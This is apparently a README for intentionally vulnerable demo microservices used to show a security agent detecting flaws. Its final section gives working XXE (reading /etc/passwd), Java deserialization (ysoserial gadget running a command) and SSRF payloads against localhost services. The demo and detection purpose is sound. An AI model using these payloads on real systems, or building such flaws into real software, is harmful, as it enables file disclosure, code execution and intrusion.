# java-sample-apps
This repo holds a few Java apps showing the agent's ability to discover the most common vulnerabilities in microservices.

There are 6 microservice apps that implement a "book store".

## The Microservices

### bookstore-frontend (port 8000)

The bookstore-frontend app is a jax-rs app serving as a front end for the book store, exposing these
endpoints for book management:
 - GET /health
 - POST /add (this endpoint has an XXE vulnerability)
 - GET /list
 - GET /debug
 - POST /favorites/add
 - GET /favorites
 - POST /reviews/add
 - GET /reviews

### bookstore-data-manager (port 8001)

The bookstore-data-manager app is a SpringBoot app which holds the book data, offering a few services:
 - GET /ping
 - POST /add
 - GET /dump?title=_title_
 - POST /update (this "internal only" endpoint has a deserialization vulnerability)
 - GET /list
 
### bookstore-devservice (port 8002)

The bookstore-debug app is a Dropwizard app that offers info to the devs:
 - GET /application/ping
 - GET /application/info?env=qa (this endpoint has an SSRF vulnerability)

### bookstore-profanity-checker (port 8003)

The bookstore-profanity-checker app is a RESTEasy (https://resteasy.github.io/) app that offers a profanity check to new book titles:
 - GET /api/ping
 - GET /api/profanity/check/title?title=Title+Here
 - POST /api/profanity/check/book

### bookstore-favorites

The bookstore-favorites app is a Node Express app that offers storage of user favorites via a MongoDB database:
 - GET /ping
 - GET /favorites?*query_terms*
 - POST /favorites
 - GET /favorites/_id_
 - DELETE /favorites/_id_

### bookstore-reviews

THe bookstore-reviews app is a Python Fask app that offers user reviews of the books via a MongoDB database:
 - GET /ping
 - GET /reviews?*query_terms*
 - POST /reviews

## Usage

The first step is to edit `env-contrast-user` with your user credentials from
Team Server.  Note that these are not the same as your agent credentials which
are used when running the apps.  More details are in the files to edit.  Then
build the services (uses Bash syntax).  docker-compose will normally build the
images as needed, but in this case you need to provide environment variables
for the agent-grabber container, which downloads the latest agents from your
Team Server account.
```
$ env $(grep -v \# env-contrast-user|xargs) docker-compose -f docker-compose.yml -f docker-compose-contrast.yml build
```

To start normally:
```
$ docker-compose up
```

To start with Contrast enabled, first edit `contrast_security.yaml` with your agent credentials, then:
```
$ docker-compose -f docker-compose.yml -f docker-compose-contrast.yml up
```

The latest Contrast agent will be pulled down via the agent-grabber container,
when it is built.  If you want to grab a new version of the agent, you may
need to (note that the second command uses Bash syntax):
```
$ docker-compose down
$ env $(grep -v \# env-contrast-user|xargs) docker-compose -f docker-compose.yml -f docker-compose-contrast.yml build
```

If you don't want to use docker-compose, each service has a Dockerfile you can
run manually. Consult each service's `README.md` to see the commands.

### Using the services

You're _supposed_ to do everything through the frontend service.  The script
`exercise-apps.sh` performs the steps described below.

Get a health check on the entire bookstore service mesh:
```
$ curl http://localhost:8000/health
```

List all the books:
```
$ curl http://localhost:8000/list
```

Add a book:
```
$ curl -H "Content-Type: application/xml" http://localhost:8000/add -d '<book><title>The Giving Tree</title><pages>30</pages></book>'
```

Alternatively, you can add a book through the backend service directly, where it expects JSON:
```
$ curl -X POST -H "Content-Type: application/json" http://localhost:8001/add -d '{"pages":"30", "title":"The Giving Tree"}'
```

Get debug info on the service:
```
$ curl http://localhost:8000/debug
```

You can also check a title value for profanity (the "profane" word list for this PG-rated filter is available in `ProfanityRestservice.java`). This is done automatically through the "add a new book" endpoint:
```
$ curl http://localhost:8003/api/profanity/check/title?title=This+Darn+Title
```

You can dump a serialized Java object for a title via an internal-only endpoint:
```
curl -o _serialized-java-object-file_ 'http://localhost:8001/dump?title=Dune'
```

You can update an existing title via an internal-only endpoint:
```
$ curl -H 'Content-type: application/octet-stream' --data-binary @_serialized-java-object-file_ http;//localhost:8001/update
```

(Normally the update endpoint would be given a modified version of the java object)

The reviews and favorites are accessible from the frontend.  You can view them:
```
$ curl http://localhost:8000/favorites
$ curl http://localhost:8000/reviews
$ curl 'http://localhost:8000/favorites?user=Bob'
$ curl 'http://localhost:8000/reviews?user=Bob'
```

and add new ones:
```
$ curl -X POST -H "Content-Type: application/xml" http://localhost:8000/favorites/add -d '<favorite><title>Billychuck</title><user>Jon</user></favorite>'
$ curl -X POST -H "Content-Type: application/xml" http://localhost:8000/reviews/add -d '<review><user>Jon</user><title>Billychuck</title><score>5.0</score><comments>My new favorite!</comments></review>'
```

## Detecting the vulnerabilities
To detect the vulnerabilities, start the apps with Contrast enabled as
described above.  Then use the services or `exercise-apps.sh` to exercise the
code.  Note that it isn't necessary to exploit the vulnerabilities in order
for Contrast to identify the vulnerabilities.

## Exploiting the Vulnerabilities

### XML External Entity (XXE)
The XXE vulnerability can be exploited directly in the bookstore-frontend by
adding a new malicious book:
```
$ curl -H "Content-Type: application/xml" http://localhost:8000/add -d '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "/etc/passwd">]><book><title>foo &xxe;</title><pages>21</pages></book>'
```

Now the contents of `/etc/passwd` has leaked into the the new book title, which
you can see by checking the book titles:
```
$ curl http://localhost:8000/list
```

### Deserialization
The `bookstore-data-manager` offers an "update a book" service that is not
supposed to be used from the outside, which is why it's not available through
the `bookstore-frontend`.

This service is available at `/update`, and it accepts a binary, serialized
Java object with `Book` type.

To exploit this, we must first make an exploit that creates a file in `/tmp` as
a proof-of-concept:
```
$ git clone https://github.com/frohoff/ysoserial
$ cd ysoserial
$ docker build -t ysoserial .
$ docker run --rm ysoserial CommonsCollections5 '/usr/bin/touch /tmp/hacked' > commonscollections5.ser
```

Now you can send the exploit generated in the `commonscollections5.ser` file:
```
$ curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@commonscollections5.ser" http://localhost:8001/update
```

To prove that we created this `/tmp/hacked` file, we must shell into the
running container. 

If you started with docker-compose, the container ID is something like
java-microservice-sample-apps_bookstore-datamanager_1.

If you ran the containers manually, you can start with the ID:
```
$ docker ps
CONTAINER ID        IMAGE                    COMMAND                 CREATED              STATUS              PORTS                              NAMES
*[RUNNING_CONTAINER_ID]*        bookstore-data-manager   "mvn spring-boot:run"
```

Now, using that container ID, we shell into the container and confirm the exploit created the `/tmp/hacked` file:
```
$ docker exec -it java-microservice-sample-apps_bookstore-datamanager_1 ls -al /tmp/hacked
...
-rw-r--r-- 1 root root 0 <time> /tmp/hacked
```

### Server Side Request Forgery (SSRF)
The bookstore-frontend exposes an info service, only intended for developers.
It is intended to be used to retrieve data about different developer
environments, but it can be used to force the app to retrieve data from other
URLs:
```
$ curl http://localhost:8002/application/info?env=google.com/?
```

Obviously in this case we ask the server to retrieve Google content, but it
could just as easily be pointed towards URLs typically only accessed within
your perimeter.

```
$ curl http://localhost:8002/application/info?env=SECRET
```
